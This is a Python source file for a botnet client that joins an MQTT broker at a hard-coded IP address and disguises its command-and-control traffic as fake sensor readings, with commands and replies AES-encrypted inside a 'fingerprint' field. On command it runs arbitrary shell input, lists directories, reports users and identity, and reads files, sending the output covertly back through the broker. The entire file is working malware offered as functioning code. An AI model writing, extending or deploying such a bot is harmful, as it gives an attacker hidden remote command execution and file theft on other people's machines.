import paho.mqtt.client as mqtt
import json
import subprocess
import os
import random
import time
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

# --- CONFIGURATION ---
BROKER = "147.32.82.209"
PORT = 1883
TOPIC = "sensors"
SALT = "S4ur0ns_S3cr3t_S4lt_2025" # Shared secret between Bot and Controller
BOT_ID = f"sensor_{random.randint(1000, 9999)}"

# --- CRYPTO HELPER ---
def derive_key(data_dict):
    """
    Generates AES key from visible public data + SECRET SALT.
    Key = MD5(sensor_id + temp + hum + bat + SALT)
    """
    # Combine fields into a string
    raw_str = (SALT + str(data_dict.get("sensor_id", "")) + 
               str(data_dict.get("temp", "")) + 
               str(data_dict.get("hum", "")) + 
               str(data_dict.get("bat", ""))) # <--- The secret ingredient
    
    # Create 32-byte key (MD5 is 16 bytes, so we duplicate it for AES-256)
    md5_hash = hashlib.md5(raw_str.encode()).digest()
    return md5_hash + md5_hash

def decrypt_fingerprint(fingerprint_hex, key):
    try:
        # Convert hex to bytes
        encrypted_data = bytes.fromhex(fingerprint_hex)
        
        # Extract IV (first 16 bytes) and Ciphertext
        iv = encrypted_data[:16]
        ciphertext = encrypted_data[16:]
        
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)
        return decrypted.decode()
    except Exception as e:
        return None

def encrypt_data(plaintext, key):
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    # Return as hex string (IV + Ciphertext)
    return (iv + ciphertext).hex()

# --- NETWORK LOGIC ---
def send_response(client, original_sender, result_output):
    # 1. Create Fake Sensor Data
    fake_data = {
        "sensor_id": BOT_ID,
        "temp": round(random.uniform(20.0, 30.0), 1),
        "hum": round(random.uniform(40.0, 60.0), 1),
        "bat": random.randint(80, 100)
    }
    
    # 2. Derive Key from this new data + SALT
    key = derive_key(fake_data)
    
    # 3. Create the Payload
    payload_json = json.dumps({
        "target": original_sender,
        "sender": BOT_ID,
        "type": "response",
        "output": result_output
    })
    
    # 4. Encrypt and attach as 'fingerprint'
    fake_data["fingerprint"] = encrypt_data(payload_json, key)
    
    # 5. Publish
    client.publish(TOPIC, json.dumps(fake_data))

def handle_command(client, cmd_packet):
    target = cmd_packet.get("target")
    sender = cmd_packet.get("sender")
    
    if target != "ALL" and target != BOT_ID:
        return

    command = cmd_packet.get("cmd")
    arg = cmd_packet.get("arg", "")
    
    print(f"[*] Command received: {command} {arg}")
    output = ""
    
    try:
        if command == "ping":
            output = "Pong"
        elif command == "w":
            output = subprocess.getoutput("w")
        elif command == "ls":
            path = arg if arg else "."
            output = subprocess.getoutput(f"ls -la {path}")
        elif command == "id":
            output = subprocess.getoutput("id")
        elif command == "exec":
            output = subprocess.getoutput(arg)
        elif command == "copy":
            if os.path.exists(arg):
                # Simple file read
                with open(arg, "r", errors='ignore') as f:
                    output = f"FILE_START:{arg}:{f.read()}"
            else:
                output = "File not found"
        else:
            output = "Unknown Cmd"
    except Exception as e:
        output = str(e)

    send_response(client, sender, output)

def on_message(client, userdata, msg):
    try:
        payload = json.loads(msg.payload.decode())
        
        # Check if it has a fingerprint
        if "fingerprint" in payload:
            key = derive_key(payload)
            decrypted_json = decrypt_fingerprint(payload["fingerprint"], key)
            
            if decrypted_json:
                cmd_packet = json.loads(decrypted_json)
                # Ensure it's a command, not a response from another bot
                if cmd_packet.get("type") == "command":
                    handle_command(client, cmd_packet)
    except:
        pass # Ignore malformed or irrelevant packets

if __name__ == "__main__":
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
    client.on_message = on_message
    print(f"[*] Bot {BOT_ID} listening...")
    client.connect(BROKER, PORT, 60)
    client.loop_forever()